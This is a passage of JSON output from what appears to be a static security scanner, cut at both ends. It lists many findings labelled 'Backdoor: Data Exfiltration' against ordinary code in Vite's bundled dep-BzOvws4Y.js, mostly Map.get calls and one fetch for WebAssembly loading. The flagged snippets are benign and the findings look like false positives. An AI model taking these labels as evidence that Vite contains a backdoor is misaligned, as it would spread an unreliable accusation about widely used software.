            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52393,
                  "startColumn": 41,
                  "endLine": 52393,
                  "endColumn": 46,
                  "snippet": {
                    "text": "        } else {\n          for (const spec of node.specifiers) {\n            const local = spec.local.name;\n            const binding = idToImportMap.get(local);\n            const exportedAs = spec.exported.type === \"Identifier\" ? spec.exported.name : (\n              // @ts-expect-error TODO: Estree types don't consider arbitrary module namespace specifiers yet\n              spec.exported.value\n",
                    "rendered": {
                      "text": "        } else {\n          for (const spec of node.specifiers) {\n            const local = spec.local.name;\n            const binding = idToImportMap.get(local);\n            const exportedAs = spec.exported.type === \"Identifier\" ? spec.exported.name : (\n              // @ts-expect-error TODO: Estree types don't consider arbitrary module namespace specifiers yet\n              spec.exported.value\n",
                      "markdown": "`        } else {\n          for (const spec of node.specifiers) {\n            const local = spec.local.name;\n            const binding = idToImportMap.get(local);\n            const exportedAs = spec.exported.type === \"Identifier\" ? spec.exported.name : (\n              // @ts-expect-error TODO: Estree types don't consider arbitrary module namespace specifiers yet\n              spec.exported.value\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 51811,
                  "startColumn": 56,
                  "endLine": 51811,
                  "endColumn": 61,
                  "snippet": {
                    "text": "e ? `This file is in ${publicDirName} and will be copied as-is during build without going through the plugin transforms, and therefore should not be imported from source code. It can only be referenced via HTML tags.` : `Does the file exist?`;\n    const importerMod = server.moduleGraph.idToModuleMap.get(id)?.importers.values().next().value;\n    const importer = importerMod?.file || importerMod?.url;\n    const err = new Error(\n      `Failed to load url ${url} (resolved id: ${id})${importer ? ` in ${importer}` : \"\"}. ${msg}`\n    );\n    err.code = isPublicFile ? ERR_LOAD_PUBLIC_URL : ERR_LOAD_URL;\n   ",
                    "rendered": {
                      "text": "e ? `This file is in ${publicDirName} and will be copied as-is during build without going through the plugin transforms, and therefore should not be imported from source code. It can only be referenced via HTML tags.` : `Does the file exist?`;\n    const importerMod = server.moduleGraph.idToModuleMap.get(id)?.importers.values().next().value;\n    const importer = importerMod?.file || importerMod?.url;\n    const err = new Error(\n      `Failed to load url ${url} (resolved id: ${id})${importer ? ` in ${importer}` : \"\"}. ${msg}`\n    );\n    err.code = isPublicFile ? ERR_LOAD_PUBLIC_URL : ERR_LOAD_URL;\n   ",
                      "markdown": "`e ? `This file is in ${publicDirName} and will be copied as-is during build without going through the plugin transforms, and therefore should not be imported from source code. It can only be referenced via HTML tags.` : `Does the file exist?`;\n    const importerMod = server.moduleGraph.idToModuleMap.get(id)?.importers.values().next().value;\n    const importer = importerMod?.file || importerMod?.url;\n    const err = new Error(\n      `Failed to load url ${url} (resolved id: ${id})${importer ? ` in ${importer}` : \"\"}. ${msg}`\n    );\n    err.code = isPublicFile ? ERR_LOAD_PUBLIC_URL : ERR_LOAD_URL;\n   `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 51665,
                  "startColumn": 41,
                  "endLine": 51665,
                  "endColumn": 46,
                  "snippet": {
                    "text": "  if (server._restartPromise && !options.ssr) throwClosedServerError();\n  const cacheKey = (options.ssr ? \"ssr:\" : options.html ? \"html:\" : \"\") + url;\n  const timestamp = Date.now();\n  const pending = server._pendingRequests.get(cacheKey);\n  if (pending) {\n    return server.moduleGraph.getModuleByUrl(removeTimestampQuery(url), options.ssr).then((module) => {\n      if (!module || pending.timestamp > module.lastInvalidationTimestamp) {\n",
                    "rendered": {
                      "text": "  if (server._restartPromise && !options.ssr) throwClosedServerError();\n  const cacheKey = (options.ssr ? \"ssr:\" : options.html ? \"html:\" : \"\") + url;\n  const timestamp = Date.now();\n  const pending = server._pendingRequests.get(cacheKey);\n  if (pending) {\n    return server.moduleGraph.getModuleByUrl(removeTimestampQuery(url), options.ssr).then((module) => {\n      if (!module || pending.timestamp > module.lastInvalidationTimestamp) {\n",
                      "markdown": "`  if (server._restartPromise && !options.ssr) throwClosedServerError();\n  const cacheKey = (options.ssr ? \"ssr:\" : options.html ? \"html:\" : \"\") + url;\n  const timestamp = Date.now();\n  const pending = server._pendingRequests.get(cacheKey);\n  if (pending) {\n    return server.moduleGraph.getModuleByUrl(removeTimestampQuery(url), options.ssr).then((module) => {\n      if (!module || pending.timestamp > module.lastInvalidationTimestamp) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 49934,
                  "startColumn": 58,
                  "endLine": 49934,
                  "endColumn": 63,
                  "snippet": {
                    "text": "const depsOptimizerMap = /* @__PURE__ */ new WeakMap();\nconst devSsrDepsOptimizerMap = /* @__PURE__ */ new WeakMap();\nfunction getDepsOptimizer(config, ssr) {\n  return (ssr ? devSsrDepsOptimizerMap : depsOptimizerMap).get(config);\n}\nasync function initDepsOptimizer(config, server) {\n  if (!getDepsOptimizer(config, false)) {\n",
                    "rendered": {
                      "text": "const depsOptimizerMap = /* @__PURE__ */ new WeakMap();\nconst devSsrDepsOptimizerMap = /* @__PURE__ */ new WeakMap();\nfunction getDepsOptimizer(config, ssr) {\n  return (ssr ? devSsrDepsOptimizerMap : depsOptimizerMap).get(config);\n}\nasync function initDepsOptimizer(config, server) {\n  if (!getDepsOptimizer(config, false)) {\n",
                      "markdown": "`const depsOptimizerMap = /* @__PURE__ */ new WeakMap();\nconst devSsrDepsOptimizerMap = /* @__PURE__ */ new WeakMap();\nfunction getDepsOptimizer(config, ssr) {\n  return (ssr ? devSsrDepsOptimizerMap : depsOptimizerMap).get(config);\n}\nasync function initDepsOptimizer(config, server) {\n  if (!getDepsOptimizer(config, false)) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 49528,
                  "startColumn": 17,
                  "endLine": 49528,
                  "endColumn": 22,
                  "snippet": {
                    "text": "  const resolve = async (id, importer, options) => {\n    const key = id + (importer && path$n.dirname(importer));\n    if (seen.has(key)) {\n      return seen.get(key);\n    }\n    const resolved = await container.resolveId(\n      id,\n",
                    "rendered": {
                      "text": "  const resolve = async (id, importer, options) => {\n    const key = id + (importer && path$n.dirname(importer));\n    if (seen.has(key)) {\n      return seen.get(key);\n    }\n    const resolved = await container.resolveId(\n      id,\n",
                      "markdown": "`  const resolve = async (id, importer, options) => {\n    const key = id + (importer && path$n.dirname(importer));\n    if (seen.has(key)) {\n      return seen.get(key);\n    }\n    const resolved = await container.resolveId(\n      id,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 48875,
                  "startColumn": 14,
                  "endLine": 48875,
                  "endColumn": 19,
                  "snippet": {
                    "text": "      const ctx = new PluginContext(plugin, this, ssr);\n      map.set(plugin, ctx);\n    }\n    return map.get(plugin);\n  }\n  // parallel, ignores returns\n  async hookParallel(hookName, context, args) {\n",
                    "rendered": {
                      "text": "      const ctx = new PluginContext(plugin, this, ssr);\n      map.set(plugin, ctx);\n    }\n    return map.get(plugin);\n  }\n  // parallel, ignores returns\n  async hookParallel(hookName, context, args) {\n",
                      "markdown": "`      const ctx = new PluginContext(plugin, this, ssr);\n      map.set(plugin, ctx);\n    }\n    return map.get(plugin);\n  }\n  // parallel, ignores returns\n  async hookParallel(hookName, context, args) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 48813,
                  "startColumn": 54,
                  "endLine": 48813,
                  "endColumn": 59,
                  "snippet": {
                    "text": "  }\n  _getAddedImports(id) {\n    const module = this.moduleGraph?.getModuleById(id);\n    return module ? this._moduleNodeToLoadAddedImports.get(module) || null : null;\n  }\n  getModuleInfo(id) {\n    const module = this.moduleGraph?.getModuleById(id);\n",
                    "rendered": {
                      "text": "  }\n  _getAddedImports(id) {\n    const module = this.moduleGraph?.getModuleById(id);\n    return module ? this._moduleNodeToLoadAddedImports.get(module) || null : null;\n  }\n  getModuleInfo(id) {\n    const module = this.moduleGraph?.getModuleById(id);\n",
                      "markdown": "`  }\n  _getAddedImports(id) {\n    const module = this.moduleGraph?.getModuleById(id);\n    return module ? this._moduleNodeToLoadAddedImports.get(module) || null : null;\n  }\n  getModuleInfo(id) {\n    const module = this.moduleGraph?.getModuleById(id);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 48599,
                  "startColumn": 31,
                  "endLine": 48599,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  const sortedPluginsCache = /* @__PURE__ */ new Map();\n  function getSortedPlugins(hookName) {\n    if (sortedPluginsCache.has(hookName))\n      return sortedPluginsCache.get(hookName);\n    const sorted = getSortedPluginsByHook(hookName, plugins);\n    sortedPluginsCache.set(hookName, sorted);\n    return sorted;\n",
                    "rendered": {
                      "text": "  const sortedPluginsCache = /* @__PURE__ */ new Map();\n  function getSortedPlugins(hookName) {\n    if (sortedPluginsCache.has(hookName))\n      return sortedPluginsCache.get(hookName);\n    const sorted = getSortedPluginsByHook(hookName, plugins);\n    sortedPluginsCache.set(hookName, sorted);\n    return sorted;\n",
                      "markdown": "`  const sortedPluginsCache = /* @__PURE__ */ new Map();\n  function getSortedPlugins(hookName) {\n    if (sortedPluginsCache.has(hookName))\n      return sortedPluginsCache.get(hookName);\n    const sorted = getSortedPluginsByHook(hookName, plugins);\n    sortedPluginsCache.set(hookName, sorted);\n    return sorted;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47814,
                  "startColumn": 35,
                  "endLine": 47814,
                  "endColumn": 40,
                  "snippet": {
                    "text": "      if (opts.__vite_skip_asset_emit__ || isWorker) {\n        return;\n      }\n      const workerMap = workerCache.get(config);\n      workerMap.assets.forEach((asset) => {\n        const duplicateAsset = bundle[asset.fileName];\n        if (duplicateAsset) {\n",
                    "rendered": {
                      "text": "      if (opts.__vite_skip_asset_emit__ || isWorker) {\n        return;\n      }\n      const workerMap = workerCache.get(config);\n      workerMap.assets.forEach((asset) => {\n        const duplicateAsset = bundle[asset.fileName];\n        if (duplicateAsset) {\n",
                      "markdown": "`      if (opts.__vite_skip_asset_emit__ || isWorker) {\n        return;\n      }\n      const workerMap = workerCache.get(config);\n      workerMap.assets.forEach((asset) => {\n        const duplicateAsset = bundle[asset.fileName];\n        if (duplicateAsset) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47795,
                  "startColumn": 39,
                  "endLine": 47795,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        const { fileNameHash } = workerMap;\n        while (match = workerAssetUrlRE.exec(code)) {\n          const [full, hash] = match;\n          const filename = fileNameHash.get(hash);\n          const replacement = toOutputFilePathInJS(\n            filename,\n            \"asset\",\n",
                    "rendered": {
                      "text": "        const { fileNameHash } = workerMap;\n        while (match = workerAssetUrlRE.exec(code)) {\n          const [full, hash] = match;\n          const filename = fileNameHash.get(hash);\n          const replacement = toOutputFilePathInJS(\n            filename,\n            \"asset\",\n",
                      "markdown": "`        const { fileNameHash } = workerMap;\n        while (match = workerAssetUrlRE.exec(code)) {\n          const [full, hash] = match;\n          const filename = fileNameHash.get(hash);\n          const replacement = toOutputFilePathInJS(\n            filename,\n            \"asset\",\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47791,
                  "startColumn": 37,
                  "endLine": 47791,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        let match;\n        s = new MagicString(code);\n        workerAssetUrlRE.lastIndex = 0;\n        const workerMap = workerCache.get(config.mainConfig || config);\n        const { fileNameHash } = workerMap;\n        while (match = workerAssetUrlRE.exec(code)) {\n          const [full, hash] = match;\n",
                    "rendered": {
                      "text": "        let match;\n        s = new MagicString(code);\n        workerAssetUrlRE.lastIndex = 0;\n        const workerMap = workerCache.get(config.mainConfig || config);\n        const { fileNameHash } = workerMap;\n        while (match = workerAssetUrlRE.exec(code)) {\n          const [full, hash] = match;\n",
                      "markdown": "`        let match;\n        s = new MagicString(code);\n        workerAssetUrlRE.lastIndex = 0;\n        const workerMap = workerCache.get(config.mainConfig || config);\n        const { fileNameHash } = workerMap;\n        while (match = workerAssetUrlRE.exec(code)) {\n          const [full, hash] = match;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47595,
                  "startColumn": 33,
                  "endLine": 47595,
                  "endColumn": 38,
                  "snippet": {
                    "text": "}\nasync function workerFileToUrl(config, id) {\n  const workerMap = workerCache.get(config.mainConfig || config);\n  let fileName = workerMap.bundle.get(id);\n  if (!fileName) {\n    const outputChunk = await bundleWorkerEntry(config, id);\n    fileName = outputChunk.fileName;\n",
                    "rendered": {
                      "text": "}\nasync function workerFileToUrl(config, id) {\n  const workerMap = workerCache.get(config.mainConfig || config);\n  let fileName = workerMap.bundle.get(id);\n  if (!fileName) {\n    const outputChunk = await bundleWorkerEntry(config, id);\n    fileName = outputChunk.fileName;\n",
                      "markdown": "`}\nasync function workerFileToUrl(config, id) {\n  const workerMap = workerCache.get(config.mainConfig || config);\n  let fileName = workerMap.bundle.get(id);\n  if (!fileName) {\n    const outputChunk = await bundleWorkerEntry(config, id);\n    fileName = outputChunk.fileName;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47594,
                  "startColumn": 31,
                  "endLine": 47594,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  return `__VITE_WORKER_ASSET__${hash}__`;\n}\nasync function workerFileToUrl(config, id) {\n  const workerMap = workerCache.get(config.mainConfig || config);\n  let fileName = workerMap.bundle.get(id);\n  if (!fileName) {\n    const outputChunk = await bundleWorkerEntry(config, id);\n",
                    "rendered": {
                      "text": "  return `__VITE_WORKER_ASSET__${hash}__`;\n}\nasync function workerFileToUrl(config, id) {\n  const workerMap = workerCache.get(config.mainConfig || config);\n  let fileName = workerMap.bundle.get(id);\n  if (!fileName) {\n    const outputChunk = await bundleWorkerEntry(config, id);\n",
                      "markdown": "`  return `__VITE_WORKER_ASSET__${hash}__`;\n}\nasync function workerFileToUrl(config, id) {\n  const workerMap = workerCache.get(config.mainConfig || config);\n  let fileName = workerMap.bundle.get(id);\n  if (!fileName) {\n    const outputChunk = await bundleWorkerEntry(config, id);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47588,
                  "startColumn": 19,
                  "endLine": 47588,
                  "endColumn": 24,
                  "snippet": {
                    "text": "function encodeWorkerAssetFileName(fileName, workerCache2) {\n  const { fileNameHash } = workerCache2;\n  const hash = getHash(fileName);\n  if (!fileNameHash.get(hash)) {\n    fileNameHash.set(hash, fileName);\n  }\n  return `__VITE_WORKER_ASSET__${hash}__`;\n",
                    "rendered": {
                      "text": "function encodeWorkerAssetFileName(fileName, workerCache2) {\n  const { fileNameHash } = workerCache2;\n  const hash = getHash(fileName);\n  if (!fileNameHash.get(hash)) {\n    fileNameHash.set(hash, fileName);\n  }\n  return `__VITE_WORKER_ASSET__${hash}__`;\n",
                      "markdown": "`function encodeWorkerAssetFileName(fileName, workerCache2) {\n  const { fileNameHash } = workerCache2;\n  const hash = getHash(fileName);\n  if (!fileNameHash.get(hash)) {\n    fileNameHash.set(hash, fileName);\n  }\n  return `__VITE_WORKER_ASSET__${hash}__`;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47507,
                  "startColumn": 31,
                  "endLine": 47507,
                  "endColumn": 36,
                  "snippet": {
                    "text": "const WORKER_FILE_ID = \"worker_file\";\nconst workerCache = /* @__PURE__ */ new WeakMap();\nfunction saveEmitWorkerAsset(config, asset) {\n  const workerMap = workerCache.get(config.mainConfig || config);\n  workerMap.assets.set(asset.fileName, asset);\n}\nasync function bundleWorkerEntry(config, id) {\n",
                    "rendered": {
                      "text": "const WORKER_FILE_ID = \"worker_file\";\nconst workerCache = /* @__PURE__ */ new WeakMap();\nfunction saveEmitWorkerAsset(config, asset) {\n  const workerMap = workerCache.get(config.mainConfig || config);\n  workerMap.assets.set(asset.fileName, asset);\n}\nasync function bundleWorkerEntry(config, id) {\n",
                      "markdown": "`const WORKER_FILE_ID = \"worker_file\";\nconst workerCache = /* @__PURE__ */ new WeakMap();\nfunction saveEmitWorkerAsset(config, asset) {\n  const workerMap = workerCache.get(config.mainConfig || config);\n  workerMap.assets.set(asset.fileName, asset);\n}\nasync function bundleWorkerEntry(config, id) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47453,
                  "startColumn": 40,
                  "endLine": 47453,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    result = await WebAssembly.instantiate(bytes, opts);\n  } else {\n    const response = await fetch(url);\n    const contentType = response.headers.get(\"Content-Type\") || \"\";\n    if (\"instantiateStreaming\" in WebAssembly && contentType.startsWith(\"application/wasm\")) {\n      result = await WebAssembly.instantiateStreaming(response, opts);\n    } else {\n",
                    "rendered": {
                      "text": "    result = await WebAssembly.instantiate(bytes, opts);\n  } else {\n    const response = await fetch(url);\n    const contentType = response.headers.get(\"Content-Type\") || \"\";\n    if (\"instantiateStreaming\" in WebAssembly && contentType.startsWith(\"application/wasm\")) {\n      result = await WebAssembly.instantiateStreaming(response, opts);\n    } else {\n",
                      "markdown": "`    result = await WebAssembly.instantiate(bytes, opts);\n  } else {\n    const response = await fetch(url);\n    const contentType = response.headers.get(\"Content-Type\") || \"\";\n    if (\"instantiateStreaming\" in WebAssembly && contentType.startsWith(\"application/wasm\")) {\n      result = await WebAssembly.instantiateStreaming(response, opts);\n    } else {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47346,
                  "startColumn": 34,
                  "endLine": 47346,
                  "endColumn": 39,
                  "snippet": {
                    "text": "  return JSON.stringify(value);\n}\nfunction getImportMetaEnvKeyRe(marker) {\n  let re = importMetaEnvKeyReCache.get(marker);\n  if (!re) {\n    re = new RegExp(`${marker}\\\\..+?\\\\b`, \"g\");\n    importMetaEnvKeyReCache.set(marker, re);\n",
                    "rendered": {
                      "text": "  return JSON.stringify(value);\n}\nfunction getImportMetaEnvKeyRe(marker) {\n  let re = importMetaEnvKeyReCache.get(marker);\n  if (!re) {\n    re = new RegExp(`${marker}\\\\..+?\\\\b`, \"g\");\n    importMetaEnvKeyReCache.set(marker, re);\n",
                      "markdown": "`  return JSON.stringify(value);\n}\nfunction getImportMetaEnvKeyRe(marker) {\n  let re = importMetaEnvKeyReCache.get(marker);\n  if (!re) {\n    re = new RegExp(`${marker}\\\\..+?\\\\b`, \"g\");\n    importMetaEnvKeyReCache.set(marker, re);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47039,
                  "startColumn": 25,
                  "endLine": 47039,
                  "endColumn": 30,
                  "snippet": {
                    "text": "  const isConfiguredAsExternal = createIsConfiguredAsSsrExternal(config);\n  return (id, importer) => {\n    if (processedIds.has(id)) {\n      return processedIds.get(id);\n    }\n    let external = false;\n    if (id[0] !== \".\" && !path$n.isAbsolute(id)) {\n",
                    "rendered": {
                      "text": "  const isConfiguredAsExternal = createIsConfiguredAsSsrExternal(config);\n  return (id, importer) => {\n    if (processedIds.has(id)) {\n      return processedIds.get(id);\n    }\n    let external = false;\n    if (id[0] !== \".\" && !path$n.isAbsolute(id)) {\n",
                      "markdown": "`  const isConfiguredAsExternal = createIsConfiguredAsSsrExternal(config);\n  return (id, importer) => {\n    if (processedIds.has(id)) {\n      return processedIds.get(id);\n    }\n    let external = false;\n    if (id[0] !== \".\" && !path$n.isAbsolute(id)) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 46959,
                  "startColumn": 40,
                  "endLine": 46959,
                  "endColumn": 45,
                  "snippet": {
                    "text": "const debug$b = createDebugger(\"vite:ssr-external\");\nconst isSsrExternalCache = /* @__PURE__ */ new WeakMap();\nfunction shouldExternalizeForSSR(id, importer, config) {\n  let isSsrExternal = isSsrExternalCache.get(config);\n  if (!isSsrExternal) {\n    isSsrExternal = createIsSsrExternal(config);\n    isSsrExternalCache.set(config, isSsrExternal);\n",
                    "rendered": {
                      "text": "const debug$b = createDebugger(\"vite:ssr-external\");\nconst isSsrExternalCache = /* @__PURE__ */ new WeakMap();\nfunction shouldExternalizeForSSR(id, importer, config) {\n  let isSsrExternal = isSsrExternalCache.get(config);\n  if (!isSsrExternal) {\n    isSsrExternal = createIsSsrExternal(config);\n    isSsrExternalCache.set(config, isSsrExternal);\n",
                      "markdown": "`const debug$b = createDebugger(\"vite:ssr-external\");\nconst isSsrExternalCache = /* @__PURE__ */ new WeakMap();\nfunction shouldExternalizeForSSR(id, importer, config) {\n  let isSsrExternal = isSsrExternalCache.get(config);\n  if (!isSsrExternal) {\n    isSsrExternal = createIsSsrExternal(config);\n    isSsrExternalCache.set(config, isSsrExternal);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45730,
                  "startColumn": 51,
                  "endLine": 45730,
                  "endColumn": 56,
                  "snippet": {
                    "text": "      const base = path$n.posix.basename(normalizedFile);\n      for (const ext of extensions) {\n        const fileName = base + ext;\n        const fileDirentCache = direntCache.dirents.get(fileName);\n        if (fileDirentCache) {\n          const filePath = dirPath + \"/\" + fileName;\n          ensureFileMaybeSymlinkIsResolved(fileDirentCache, filePath);\n",
                    "rendered": {
